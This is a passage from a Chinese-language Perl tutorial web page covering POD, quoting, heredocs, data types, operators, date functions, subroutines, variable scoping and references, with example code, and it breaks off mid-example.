=cut只能在行首。</span></span><br><span class="line"><span class="comment">#  以=开头，以=cut结尾。</span></span><br><span class="line"><span class="comment">#  =后面要紧接一个字符，=cut后面可以不用。</span></span><br></pre></td></tr></table></figure>
<p>Pod(Plain Old Documentation), 是一种简单而易用的标记型语言（置标语言），它经常用于在perl程序和模块中的文档书写。</p>
<p>Pod 的 转化器可以将 Pod 转换成很多种格式，例如 text, html, man 等很多。</p>
<h3 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h3><p>Perl 解释器不会关心有多少个空白</p>
<p>Perl 标识符区分大小写</p>
<h3 id="单引号和双引号"><a href="#单引号和双引号" class="headerlink" title="单引号和双引号"></a>单引号和双引号</h3><p>（1）双中有双，单中有单都需要 \ 转义。</p>
<p>（2）双中有单或单中有双均不需要转义。</p>
<p>（3）单引号直接了当，引号内是什么就显示什么，双引号则需要考虑转义或变量替换等。</p>
<p>（4）单引号内可以使用多行文本。</p>
<h3 id="Here-文档"><a href="#Here-文档" class="headerlink" title="Here 文档"></a>Here 文档</h3><p>Here文档又称作heredoc、hereis、here-字串或here-脚本，是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字串的方法。</p>
<p>使用概述：</p>
<p>1.必须后接分号，否则编译通不过。</p>
<p>2.EOF 可以用任意其它字符代替，只需保证结束标识与开始标识一致。</p>
<p>3.结束标识必须顶格独自占一行。</p>
<p>4.开始标识可以不带引号号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号。</p>
<p>5.当内容需要内嵌引号（单引号或双引号）时，不需要加转义符。</p>
<p><strong>示例</strong>：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl</span></span><br><span class="line"></span><br><span class="line">$a = <span class="number">10</span>;</span><br><span class="line">$var = &lt;&lt;<span class="string">"EOF"</span>;</span><br><span class="line">这是一个 Here 文档实例，使用双引号。</span><br><span class="line">可以在这输如字符串和变量。</span><br><span class="line">例如：a = $a</span><br><span class="line">EOF</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$var\n"</span>;</span><br><span class="line"></span><br><span class="line">$var = &lt;&lt;<span class="string">'EOF'</span>;</span><br><span class="line">这是一个 Here 文档实例，使用单引号。</span><br><span class="line">例如：a = $a</span><br><span class="line">EOF</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$var\n"</span>;</span><br></pre></td></tr></table></figure>
<p><strong>输出结果</strong>：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这是一个 Here 文档实例，使用双引号。</span><br><span class="line">可以在这输如字符串和变量。</span><br><span class="line">例如：a = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">这是一个 Here 文档实例，使用单引号。</span><br><span class="line">例如：a = $a</span><br></pre></td></tr></table></figure>
<h3 id="use-strict"><a href="#use-strict" class="headerlink" title="use strict"></a>use strict</h3><p>​    use strict是Perl中编译指令，是提供给Perl编译器的指令，告诉编译器，如果perl代码中有不好的编码风格，那么提示编译失败。也就是说，加上use strict后，我们的Perl代码的编写必须遵循一些规范，否则编译器会报错。</p>
<h2 id="Perl-数据类型"><a href="#Perl-数据类型" class="headerlink" title="Perl 数据类型"></a>Perl 数据类型</h2><p>Perl 是一种弱类型语言，所以变量不需要指定类型，Perl 解释器会根据上下文自动选择匹配类型。</p>
<p>Perl 有三个基本的数据类型：标量、数组、哈希。</p>
<h3 id="标量"><a href="#标量" class="headerlink" title="标量"></a>标量</h3><p>是Perl语言中最简单的一种数据类型。这种数据类型的变量可以是数字，字符串，浮点数，不作严格的区分。在使用时在变量的名字前面加上一个”$”,表示是标量。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$myfirst=<span class="number">123</span>;　    <span class="comment">#数字123</span></span><br><span class="line">$mysecond=<span class="string">"123"</span>;   <span class="comment">#字符串123</span></span><br></pre></td></tr></table></figure>
<p>字符串之间可以用小数点拼接。</p>
<p>可以使用单引号来输出多行字符串。</p>
<h4 id="v-字符串"><a href="#v-字符串" class="headerlink" title="v 字符串"></a>v 字符串</h4><p>一个以 v 开头,后面跟着一个或多个用句点分隔的整数,会被当作一个字串文本。</p>
<p>当你想为每个字符 直接声明其数字值时,v-字串提供了一种更清晰的构造这类字串的方法，而不像 “\x{1}\x{14}\x{12c}\x{fa0}” 这种不易于理解</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$smile  = v9786;</span><br><span class="line">$foo    = v102.<span class="number">111.111</span>;</span><br><span class="line">$martin = v77.<span class="number">97.114</span>.<span class="number">116.105</span>.<span class="number">110</span>; </span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="string">"smile = $smile\n"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"foo = $foo\n"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"martin = $martin\n"</span>;</span><br></pre></td></tr></table></figure>
<p>结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smile = &amp;#x263a;</span><br><span class="line">foo = foo</span><br><span class="line">martin = Martin</span><br></pre></td></tr></table></figure>
<h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 创建数组，以 @ 符号开始，也可以以 qw 开始定义数组。</span></span><br><span class="line">@array = (<span class="number">1</span>, <span class="number">2</span>, <span class="string">'Hello'</span>);</span><br><span class="line">@array = <span class="keyword">qw</span>/<span class="number">1</span> <span class="number">2</span> <span class="string">'Hello'</span>/;</span><br><span class="line"></span><br><span class="line"><span class="comment">## 负数索引，反向读取</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"$array[-1]\n"</span>;</span><br><span class="line"><span class="comment">## 可以直接在列表后面加索引</span></span><br><span class="line">$var = (<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>)[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">## 数组序列号: (起始值 + .. + 结束值)</span></span><br><span class="line">@var_10 = (<span class="number">1</span>..<span class="number">10</span>);	<span class="comment">#from 1 to 10</span></span><br><span class="line">@var_abc = (a..z);	<span class="comment">#from a to z</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 数组大小 和 最大索引</span></span><br><span class="line">$size = @array;</span><br><span class="line">$max_index = $#array;</span><br><span class="line"></span><br><span class="line"><span class="comment">## 添加和删除数组元素</span></span><br><span class="line"><span class="keyword">push</span>(@sites, <span class="string">"baidu"</span>);   <span class="comment"># 在数组结尾添加一个元素</span></span><br><span class="line"><span class="keyword">unshift</span>(@sites, <span class="string">"weibo"</span>);<span class="comment"># 在数组开头添加一个元素</span></span><br><span class="line"><span class="keyword">pop</span>(@sites);             <span class="comment"># 删除数组末尾的元素</span></span><br><span class="line"><span class="keyword">shift</span>(@sites);			 <span class="comment"># 移除数组开头的元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 切割数组</span></span><br><span class="line">@sites2 = @sites[<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line">@sites2 = @sites[<span class="number">3</span>..<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">## 替换/删除数组元素</span></span><br><span class="line"><span class="keyword">splice</span> @ARRAY, OFFSET [ , LENGTH [ , LIST ] ]</span><br><span class="line"><span class="comment">#  		@ARRAY：要替换的数组。   OFFSET：起始位置。</span></span><br><span class="line"><span class="comment">#  		LENGTH：替换的元素个数。  LIST：替换元素列表。</span></span><br><span class="line"><span class="comment">#  			不加 LIST 即为删除</span></span><br><span class="line"><span class="comment">#			LENGTH 也不加即删除到末尾</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 将字符串转换为数组</span></span><br><span class="line"><span class="keyword">split</span> [ PATTERN [ , EXPR [ , LIMIT ] ] ]</span><br><span class="line"><span class="comment">#  		PATTERN：分隔符，默认为空格。</span></span><br><span class="line"><span class="comment">#		EXPR：指定字符串数。</span></span><br><span class="line"><span class="comment">#		LIMIT：如果指定该参数，则返回该数组的元素个数。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 将数组转换为字符串</span></span><br><span class="line"><span class="keyword">join</span> EXPR, LIST</span><br><span class="line"><span class="comment">#  		EXPR：连接符。LIST：列表或数组。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 排序</span></span><br><span class="line"><span class="keyword">sort</span> [ SUBROUTINE ] LIST</span><br><span class="line"><span class="comment">#		SUBROUTINE：指定规则。默认值为 cmp,即根据 ASCII 值来排序。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 特殊变量:</span></span><br><span class="line">$[</span><br><span class="line"><span class="comment">#  $[ 表示数组的第一索引值，一般都为0,如果我们将 $[ 设置为1，则数组的第一个索引值即为1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 合并数组</span></span><br><span class="line">@numbers = (<span class="number">1</span>,<span class="number">3</span>,(<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>));</span><br><span class="line">@numbers = (@num1, @num2);</span><br></pre></td></tr></table></figure>
<h3 id="哈希"><a href="#哈希" class="headerlink" title="哈希"></a>哈希</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 创建哈希</span></span><br><span class="line"><span class="comment">#  为每个 key 设置 value</span></span><br><span class="line">$data&#123;<span class="string">'google'</span>&#125; = <span class="string">'google.com'</span>;</span><br><span class="line">$data&#123;<span class="string">'runoob'</span>&#125; = <span class="string">'runoob.com'</span>;</span><br><span class="line"><span class="comment">#  通过列表设置 3种方法</span></span><br><span class="line">%data = (<span class="string">'google'</span>, <span class="string">'google.com'</span>, <span class="string">'runoob'</span>, <span class="string">'runoob.com'</span>);</span><br><span class="line">%data = (<span class="string">'google'</span>=&gt;<span class="string">'google.com'</span>, <span class="string">'runoob'</span>=&gt;<span class="string">'runoob.com'</span>);</span><br><span class="line">%data = (<span class="string">-google=&gt;</span><span class="string">'google.com'</span>, <span class="string">-runoob=&gt;</span><span class="string">'runoob.com'</span>);</span><br><span class="line"><span class="comment">#  使用第三种方式 key 不能出现空格，读取元素方式为：</span></span><br><span class="line">$val = $data&#123;-google&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">## 读取哈希</span></span><br><span class="line">$value = $hash<span class="string">&#123;key&#125;</span></span><br><span class="line">@array = @hash&#123;key1, key2&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">## 读取所有key</span></span><br><span class="line">@array = <span class="keyword">keys</span> %hash;</span><br><span class="line"><span class="comment">## 读取所有value</span></span><br><span class="line">@array = <span class="keyword">values</span> %hash;</span><br><span class="line"><span class="comment">#  读取了所有的key或value后可以以此获取哈希的大小</span></span><br><span class="line">$size = @array</span><br><span class="line"></span><br><span class="line"><span class="comment">## 检测元素是否存在</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">exists</span>($hash<span class="string">&#123;key&#125;</span>) )&#123;	&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">## 删除元素</span></span><br><span class="line"><span class="keyword">delete</span> $hash<span class="string">&#123;key&#125;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="变量上下文"><a href="#变量上下文" class="headerlink" title="变量上下文"></a>变量上下文</h3><p>所谓上下文：指的是表达式所在的位置。</p>
<p>上下文是由等号左边的变量类型决定的，等号左边是标量，则是标量上下文，等号左边是列表，则是列表上下文。</p>
<p>Perl 解释器会根据上下文来决定变量的类型。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@names = (<span class="string">'google'</span>, <span class="string">'runoob'</span>, <span class="string">'taobao'</span>);</span><br><span class="line"> </span><br><span class="line">@copy = @names;   <span class="comment"># 复制数组</span></span><br><span class="line">$size = @names;   <span class="comment"># 数组赋值给标量，返回数组元素个数</span></span><br></pre></td></tr></table></figure>
<h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><p>以下我们将演示 Perl 中特殊字符的应用，如 <strong>FILE</strong>, <strong>LINE</strong>, 和 <strong>PACKAGE</strong> 分别表示当前执行脚本的文件名，行号，包名。</p>
<p><strong>注意</strong>： <strong> 是两条下划线，</strong>FILE__ 前后各两条下划线。</p>
<p>这些特殊字符是单独的标记，不能写在字符串中，例如：</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">"文件名 "</span>. __FILE_<span class="number">_</span> . <span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"行号 "</span> . __LINE_<span class="number">_</span> .<span class="string">"\n"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"包名 "</span> . __PACKAGE_<span class="number">_</span> .<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 无法解析</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">"__FILE__ __LINE__ __PACKAGE__\n"</span>;</span><br></pre></td></tr></table></figure>
<h2 id="Perl-运算符"><a href="#Perl-运算符" class="headerlink" title="Perl 运算符"></a>Perl 运算符</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 基本和c语一样，并且支持位运算</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 数值运算</span></span><br><span class="line">$a**$b <span class="comment">#a的b次幂</span></span><br><span class="line"></span><br><span class="line">$a==$b <span class="comment">#返回true/false</span></span><br><span class="line">$a&lt;=&gt;$b<span class="comment">#左小于右返回-1，相等返回0, 左大于右返回 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串运算</span></span><br><span class="line"><span class="keyword">lt</span>	检查左边的字符串是否小于右边的字符串</span><br><span class="line"><span class="keyword">gt</span>	检查左边的字符串是否大于右边的字符串</span><br><span class="line">le	检查左边的字符串是否小于或等于右边的字符串</span><br><span class="line">ge	检查左边的字符串是否大于或等于右边的字符串</span><br><span class="line">eq	检查左边的字符串是否等于右边的字符串</span><br><span class="line"><span class="keyword">ne</span>	检查左边的字符串是否不等于右边的字符串</span><br><span class="line">cmp	返回 -<span class="number">1</span>，<span class="number">0</span>，<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 引号运算符</span></span><br><span class="line"><span class="string">q&#123; &#125;</span>	为字符串添加单引号	 <span class="string">q&#123;abcd&#125;</span> 结果为 <span class="string">'abcd'</span></span><br><span class="line"><span class="string">qq&#123; &#125;</span>	为字符串添加双引号	<span class="string">qq&#123;abcd&#125;</span> 结果为 <span class="string">"abcd"</span></span><br><span class="line"><span class="string">qx&#123; &#125;</span>	为字符串添加反引号	<span class="string">qx&#123;abcd&#125;</span> 结果为 <span class="string">`abcd`</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他运算符</span></span><br><span class="line">.	点号 (.) 用于连接两个字符串。	如果 $a=<span class="string">"run"</span>, $b=<span class="string">"oob"</span> ， $a.$b 结果为 <span class="string">"runoob"</span></span><br><span class="line"><span class="keyword">x</span>	<span class="keyword">x</span> 运算符返回字符串重复的次数。	(<span class="string">'-'</span> <span class="keyword">x</span> <span class="number">3</span>) 输出为 ---。</span><br><span class="line">..	.. 为范围运算符。	(<span class="number">2</span>..<span class="number">5</span>) 输出结果为 (<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>)</span><br><span class="line">++	自增运算符，整数值增加 <span class="number">1</span>	$a =<span class="number">10</span>, $a++ will 输出为 <span class="number">11</span></span><br><span class="line">--	自减运算符，整数值减少 <span class="number">1</span>	$a =<span class="number">10</span>, $a-- 输出为 <span class="number">9</span></span><br><span class="line">-&gt;	箭号用于指定一个类的方法	$obj-&gt;$a 表示对象 $obj 的 $a 方法。</span><br></pre></td></tr></table></figure>
<h2 id="Perl-时间日期"><a href="#Perl-时间日期" class="headerlink" title="Perl 时间日期"></a>Perl 时间日期</h2><ul>
<li><strong>localtime()</strong></li>
</ul>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sec,     <span class="comment"># 秒， 0 到 61</span></span><br><span class="line">min,     <span class="comment"># 分钟， 0 到 59</span></span><br><span class="line">hour,    <span class="comment"># 小时， 0 到 24</span></span><br><span class="line">mday,    <span class="comment"># 天， 1 到 31</span></span><br><span class="line">mon,     <span class="comment"># 月， 0 到 11</span></span><br><span class="line">year,    <span class="comment"># 年，从 1900 开始</span></span><br><span class="line">wday,    <span class="comment"># 星期几，0-6,0表示周日</span></span><br><span class="line">yday,    <span class="comment"># 一年中的第几天,0-364,365</span></span><br><span class="line">isdst    <span class="comment"># 如果夏令时有效，则为真</span></span><br></pre></td></tr></table></figure>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@months = <span class="string">qw( 一月 二月 三月 四月 五月 六月 七月 八月 九月 十月 十一月 十二月 )</span>;</span><br><span class="line">@days = <span class="string">qw(星期天 星期一 星期二 星期三 星期四 星期五 星期六)</span>;</span><br><span class="line">($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = <span class="keyword">localtime</span>();</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$mday $months[$mon] $days[$wday]\n"</span>;</span><br></pre></td></tr></table></figure>
<p>也可以直接调用 localtime() ，它返回系统当期设置时区的时间</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$datestring = <span class="keyword">localtime</span>();</span><br><span class="line"><span class="keyword">print</span> <span class="string">"时间日期为：$datestring\n"</span>;</span><br></pre></td></tr></table></figure>
<p>格式化日期和时间</p>
<p><code>printf(&quot;%02d:%02d:%02d&quot;, $hour, $min, $sec);</code></p>
<ul>
<li><p><strong>gmtime()</strong> 类似，返回标准格林威治 (GMT)时间</p>
</li>
<li><p><strong>time()</strong>  获取新纪元时间，返回从1970年1月1日起累计的秒数。</p>
</li>
<li><p><strong>strftime()</strong> 可以将时间格式化为我们想要的格式。<a href="http://www.runoob.com/perl/perl-date-time.html" target="_blank" rel="noopener">用法</a>]</p>
</li>
</ul>
<h2 id="Perl-子程序-函数"><a href="#Perl-子程序-函数" class="headerlink" title="Perl 子程序(函数)"></a>Perl 子程序(函数)</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">subroutine</span></span>&#123;</span><br><span class="line">   statements;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 函数定义</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">Hello</span></span>&#123;</span><br><span class="line">   <span class="keyword">print</span> <span class="string">"Hello, World!\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 函数调用</span></span><br><span class="line">Hello();</span><br></pre></td></tr></table></figure>
<h3 id="传递参数"><a href="#传递参数" class="headerlink" title="传递参数"></a>传递参数</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 子程序参数使用特殊数组 @_ 标明</span></span><br><span class="line"><span class="comment"># 子程序第一个参数为 $_[0], 第二个参数为 $_[1], 以此类推。</span></span><br><span class="line"><span class="comment"># 不论参数是标量型还是数组型的，用户把参数传给子程序时，perl默认按引用的方式调用它们。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 例子：定义求平均值函数</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">Average</span></span>&#123;</span><br><span class="line">   <span class="comment"># 获取所有传入的参数</span></span><br><span class="line">   $n = <span class="keyword">scalar</span>(@_);</span><br><span class="line">   $sum = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">foreach</span> $item (@_)&#123;</span><br><span class="line">      $sum += $item;</span><br><span class="line">   &#125;</span><br><span class="line">   $average = $sum / $n;</span><br><span class="line">   <span class="keyword">print</span> <span class="string">'传入的参数为 : '</span>,<span class="string">"@_\n"</span>;           <span class="comment"># 打印整个数组</span></span><br><span class="line">   <span class="keyword">print</span> <span class="string">"第一个参数值为 : $_[0]\n"</span>;         <span class="comment"># 打印第一个参数</span></span><br><span class="line">   <span class="keyword">print</span> <span class="string">"传入参数的平均值为 : $average\n"</span>;  <span class="comment"># 打印平均值</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果我们需要传入标量和数组参数时，需要把列表放在最后一个参数上</span></span><br><span class="line">func($a, @b);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 向子程序传递哈希</span></span><br><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">PrintHash</span></span>&#123;</span><br><span class="line">   <span class="keyword">my</span> (%hash) = @_;</span><br><span class="line">   <span class="keyword">foreach</span> <span class="keyword">my</span> $key ( <span class="keyword">keys</span> %hash )&#123;</span><br><span class="line">      <span class="keyword">my</span> $value = $hash&#123;$key&#125;;</span><br><span class="line">      <span class="keyword">print</span> <span class="string">"$key : $value\n"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p>如果没有使用 return 语句，则子程序的最后一行语句将作为返回值。</p>
<h3 id="私有变量"><a href="#私有变量" class="headerlink" title="私有变量"></a>私有变量</h3><p>默认情况下，Perl 中所有的变量都是全局变量，这就是说变量在程序的任何地方都可以调用。</p>
<p>可以使用 <strong>my</strong> 操作符来设置私有变量。</p>
<p><strong>my</strong> 操作符用于创建词法作用域变量，通过 <strong>my</strong> 创建的变量，存活于声明开始的地方，直到闭合作用域的结尾。</p>
<p>闭合作用域指的可以是一对花括号中的区域，可以是一个文件，也可以是一个 if, while, for, foreach, eval字符串。</p>
<h3 id="变量的临时赋值"><a href="#变量的临时赋值" class="headerlink" title="变量的临时赋值"></a>变量的临时赋值</h3><p>我们可以使用 local 为全局变量提供临时的值，在退出作用域后将原来的值还回去。</p>
<p>local 定义的变量不存在于主程序中，但存在于该子程序和该子程序调用的子程序中。定义时可以给其赋值。</p>
<h3 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h3><p>state操作符功能类似于C里面的static修饰符。</p>
<p>state也是词法变量，所以只在定义该变量的词法作用域中有效。</p>
<ul>
<li><p>state仅能创建闭合作用域为子程序内部的变量。</p>
</li>
<li><p>state是从Perl 5.9.4开始引入的，所以使用前必须加上 use。<code>use feature &#39;state&#39;;</code></p>
</li>
<li><p>state可以声明标量、数组、哈希。但在声明数组和哈希时，不能对其初始化（至少Perl 5.14不支持）。</p>
</li>
</ul>
<h3 id="子程序调用上下文"><a href="#子程序调用上下文" class="headerlink" title="子程序调用上下文"></a>子程序调用上下文</h3><p>子程序调用过程中，会根据上下文来返回不同类型的值。</p>
<p>比如 localtime() ，在标量上下文返回字符串，在列表上下文返回列表。</p>
<h2 id="Perl-引用"><a href="#Perl-引用" class="headerlink" title="Perl 引用"></a>Perl 引用</h2><h3 id="变量引用"><a href="#变量引用" class="headerlink" title="变量引用"></a>变量引用</h3><p>定义变量的时候，在变量名前面加个\，就得到了这个变量的一个引用。</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$scalarref = \$foo;     <span class="comment"># 标量变量引用</span></span><br><span class="line">$arrayref  = \@ARGV;    <span class="comment"># 列表的引用</span></span><br><span class="line">$hashref   = \%ENV;     <span class="comment"># 哈希的引用</span></span><br><span class="line">$coderef   = \&amp;handler; <span class="comment"># 子过程引用</span></span><br><span class="line">$globref   = \*foo;     <span class="comment"># GLOB句柄引用</span></span><br></pre></td></tr></table></figure>
<h3 id="匿名引用"><a href="#匿名引用" class="headerlink" title="匿名引用"></a>匿名引用</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 匿名数组引用</span></span><br><span class="line">$aref= [ <span class="number">1</span>,<span class="string">"foo"</span>,<span class="keyword">undef</span>,<span class="number">13</span> ];</span><br><span class="line"><span class="keyword">my</span> $aref = [</span><br><span class="line">        [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>],</span><br><span class="line">        [<span class="number">7</span>, 